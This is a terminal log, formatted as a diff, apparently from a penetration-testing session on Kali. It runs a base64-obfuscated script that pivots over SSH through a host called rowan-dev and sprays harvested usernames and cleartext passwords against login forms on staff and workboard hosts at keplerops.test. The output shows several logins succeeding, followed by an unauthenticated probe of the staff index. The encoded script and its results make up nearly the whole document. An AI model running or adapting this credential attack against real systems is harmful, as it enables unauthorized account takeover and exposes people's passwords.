@@ -1,0 +1,32 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r25.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKdHJ5KCl7IEg9JDE7IFU9JDI7IFA9JDM7IEo9L3RtcC9sal8kUkFORE9NLnR4dDsgcm0gLWYgJEoKICBjdXJsIC1zUyAtbSA4IC0tY2FjZXJ0ICRDQSAtYyAkSiAiaHR0cHM6Ly8kSC5rZXBsZXJvcHMudGVzdC9sb2dpbiIgLW8gL3RtcC9sZy5odG1sCiAgQz0kKGdyZXAgLW9FICduYW1lPSJjc3JmX3Rva2VuIiB2YWx1ZT0iW14iXSsiJyAvdG1wL2xnLmh0bWwgfCBzZWQgLUUgJ3MvLip2YWx1ZT0iKFteIl0rKSIuKi9cMS8nKQogIG91dD0kKGN1cmwgLXNTIC1tIDggLS1jYWNlcnQgJENBIC1iICRKIC1jICRKIC1pIC1YIFBPU1QgImh0dHBzOi8vJEgua2VwbGVyb3BzLnRlc3QvbG9naW4vY2hlY2siIFwKICAgIC0tZGF0YS11cmxlbmNvZGUgImNzcmZfdG9rZW49JEMiIC0tZGF0YS11cmxlbmNvZGUgInVzZXJuYW1lPSRVIiAtLWRhdGEtdXJsZW5jb2RlICJwYXNzd29yZD0kUCIgXAogICAgLS1kYXRhLXVybGVuY29kZSAicmVtZW1iZXJfbWU9MSIgLW8gL3RtcC9sci50eHQ7IGhlYWQgLTEgL3RtcC9sci50eHQpCiAgbG9jPSQoZ3JlcCAtaSAnXmxvY2F0aW9uOicgL3RtcC9sci50eHQgfCB0ciAtZCAnXHInIHwgYXdrICd7cHJpbnQgJDJ9JykKICBib2R5PSQodHIgLWQgJ1xuJyA8IC90bXAvbHIudHh0IHwgZ3JlcCAtb0UgJyhJbnZhbGlkfGluY29ycmVjdHxsb2NrZWR8ZXJyb3J8ZGVuaWVkKVtePCJdezAsNjB9JyB8IGhlYWQgLTEpCiAgZWNobyAiSD0kSCBVPSRVIFA9JHtQOjA6MTJ9Li4uIC0+ICRvdXQgTE9DPSRsb2MgRVJSPSRib2R5Igp9CmZvciBIIGluIHN0YWZmIHdvcmtib2FyZDsgZG8KIHRyeSAkSCByb3dhbi5pdG8gZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvCiB0cnkgJEggcm93YW4uaXRvIGZpZWxkbGluay1kZXYtMjg0MQogdHJ5ICRIIG1heWEucmFuc2NvbWJlIHNXUWEzMTA4NUZUUWVrWmhIVHhVeWZfOUUxbWFycTB1cjhXTkNLbVR0bmsKIHRyeSAkSCB0YWxpYS5tb3JuYWMgSzE3cjN2MTN3VGFsaWEyODQxCiB0cnkgJEggY2luZGVyIGNpbmRlcgpkb25lCmVjaG8gIj09PSBzdGFmZiByb290L2luZGV4IHdpdGggbm8gYXV0aCA9PT0iCmN1cmwgLXNTIC1tIDggLS1jYWNlcnQgJENBIC1pIGh0dHBzOi8vc3RhZmYua2VwbGVyb3BzLnRlc3QvaW5kZXgucGhwIDI+JjEgfCBoZWFkIC0xMgpJTk5FUgo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r25.sh; bash /tmp/r25.sh; echo DONEMARK_1795195472601$((6*7))
+H=staff U=rowan.ito P=fk_developer... -> HTTP/1.1 302 Found LOC=/dashboard ERR=
+H=staff U=rowan.ito P=fieldlink-de... -> HTTP/1.1 200 OK LOC= ERR=error
+H=staff U=maya.ranscombe P=sWQa31085FTQ... -> HTTP/1.1 302 Found LOC=/dashboard ERR=
+H=staff U=talia.mornac P=K17r3v13wTal... -> HTTP/1.1 200 OK LOC= ERR=error
+H=staff U=cinder P=cinder... -> HTTP/1.1 200 OK LOC= ERR=error
+H=workboard U=rowan.ito P=fk_developer... -> HTTP/1.1 302 Found LOC=/dashboard ERR=
+H=workboard U=rowan.ito P=fieldlink-de... -> HTTP/1.1 200 OK LOC= ERR=error
+H=workboard U=maya.ranscombe P=sWQa31085FTQ... -> HTTP/1.1 302 Found LOC=/dashboard ERR=
+H=workboard U=talia.mornac P=K17r3v13wTal... -> HTTP/1.1 200 OK LOC= ERR=error
+H=workboard U=cinder P=cinder... -> HTTP/1.1 200 OK LOC= ERR=error
+=== staff root/index with no auth ===
+HTTP/1.1 302 Found
+Server: nginx
+Date: Fri, 20 Nov 2026 17:29:55 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Set-Cookie: KB_SID=362602f62513d20780672ee854fdd0fa; path=/; secure; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * data:;
+X-Content-Type-Options: nosniff
